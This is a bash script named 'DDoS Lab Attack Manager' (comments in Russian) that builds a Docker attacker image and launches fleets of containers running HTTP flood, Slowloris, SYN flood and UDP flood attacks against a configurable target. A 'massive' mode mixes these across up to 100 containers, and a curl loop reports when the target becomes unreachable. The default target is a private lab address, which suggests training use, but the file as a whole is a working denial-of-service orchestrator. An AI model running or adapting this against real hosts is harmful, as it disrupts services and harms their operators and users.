#!/bin/bash

set -e

TARGET_IP="192.168.56.10"
TARGET_PORT="8080"

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

print_banner() {
    echo -e "${BLUE}"
    echo "=================================="
    echo "    DDoS Lab Attack Manager"
    echo "=================================="
    echo -e "${NC}"
}

build_docker_images() {
    echo -e "${GREEN}Building Docker images...${NC}"
    cd docker
    docker build -t ddos-attacker -f Dockerfile.attacker .
    cd ..
    echo -e "${GREEN}Docker images built successfully!${NC}"
}

start_container_attack() {
    local attack_type=$1
    local container_count=$2
    
    echo -e "${YELLOW}Starting $container_count containers with $attack_type attack...${NC}"
    
    for i in $(seq 1 $container_count); do
        docker run -d \
            --name "attacker_${attack_type}_${i}" \
            -e TARGET_IP=$TARGET_IP \
            -e TARGET_PORT=$TARGET_PORT \
            -e ATTACK_TYPE=$attack_type \
            ddos-attacker
    done
    
    echo -e "${GREEN}Started $container_count containers for $attack_type attack${NC}"
}

stop_all_attacks() {
    echo -e "${RED}Stopping all attack containers...${NC}"
    docker ps -q --filter "name=attacker_" | xargs -r docker stop
    docker ps -a -q --filter "name=attacker_" | xargs -r docker rm
    echo -e "${GREEN}All attack containers stopped and removed${NC}"
}

show_attack_status() {
    echo -e "${BLUE}Current attack status:${NC}"
    echo "Running attack containers:"
    docker ps --filter "name=attacker_" --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"
    
    echo -e "\n${BLUE}Container logs (last 10 lines):${NC}"
    for container in $(docker ps -q --filter "name=attacker_"); do
        container_name=$(docker inspect --format='{{.Name}}' $container | sed 's/\///')
        echo -e "\n--- $container_name ---"
        docker logs --tail 5 $container
    done
}

monitor_target() {
    echo -e "${BLUE}Monitoring target server...${NC}"
    echo "Checking connection to $TARGET_IP:$TARGET_PORT"
    
    while true; do
        timestamp=$(date '+%Y-%m-%d %H:%M:%S')
        response=$(curl -s -w "\n%{http_code}\n%{time_total}\n" http://$TARGET_IP:$TARGET_PORT/ 2>/dev/null || echo "FAILED")
        
        if [[ "$response" == "FAILED" ]]; then
            echo "[$timestamp] Target unreachable!"
        else
            echo "[$timestamp] Response received"
        fi
        
        sleep 2
    done
}

massive_attack() {
    local total_containers=$1
    
    echo -e "${RED}Starting MASSIVE ATTACK with $total_containers containers!${NC}"
    
    # Распределяем типы атак
    http_containers=$((total_containers * 50 / 100))
    slowloris_containers=$((total_containers * 30 / 100))
    syn_containers=$((total_containers * 20 / 100))
    
    echo "Distribution:"
    echo "- HTTP Flood: $http_containers containers"
    echo "- Slowloris: $slowloris_containers containers"
    echo "- SYN Flood: $syn_containers containers"
    
    start_container_attack "http_flood" $http_containers
    start_container_attack "slowloris" $slowloris_containers
    start_container_attack "syn_flood" $syn_containers
    
    echo -e "${RED}MASSIVE ATTACK LAUNCHED!${NC}"
}

case "$1" in
    "build")
        print_banner
        build_docker_images
        ;;
    "http")
        print_banner
        echo -e "${YELLOW}Starting HTTP flood attack with ${2:-10} containers${NC}"
        start_container_attack "http_flood" "${2:-10}"
        ;;
    "slowloris")
        print_banner
        echo -e "${YELLOW}Starting Slowloris attack with ${2:-5} containers${NC}"
        start_container_attack "slowloris" "${2:-5}"
        ;;
    "syn")
        print_banner
        echo -e "${YELLOW}Starting SYN flood attack with ${2:-5} containers${NC}"
        start_container_attack "syn_flood" "${2:-5}"
        ;;
    "udp")
        print_banner
        echo -e "${YELLOW}Starting UDP flood attack with ${2:-5} containers${NC}"
        start_container_attack "udp_flood" "${2:-5}"
        ;;
    "massive")
        print_banner
        massive_attack "${2:-50}"
        ;;
    "stop")
        print_banner
        stop_all_attacks
        ;;
    "status")
        print_banner
        show_attack_status
        ;;
    "monitor")
        print_banner
        monitor_target
        ;;
    *)
        print_banner
        echo -e "${YELLOW}Usage: $0 {build|http|slowloris|syn|udp|massive|stop|status|monitor} [container_count]${NC}"
        echo ""
        echo "Commands:"
        echo "  build                    - Build Docker images"
        echo "  http [count]            - Start HTTP flood attack (default: 10 containers)"
        echo "  slowloris [count]       - Start Slowloris attack (default: 5 containers)"
        echo "  syn [count]             - Start SYN flood attack (default: 5 containers)"
        echo "  udp [count]             - Start UDP flood attack (default: 5 containers)"
        echo "  massive [count]         - Start massive mixed attack (default: 50 containers)"
        echo "  stop                    - Stop all attacks"
        echo "  status                  - Show attack status"
        echo "  monitor                 - Monitor target server"
        echo ""
        echo "Examples:"
        echo "  $0 build"
        echo "  $0 http 20"
        echo "  $0 massive 100"
        echo "  $0 stop"
        ;;
esac 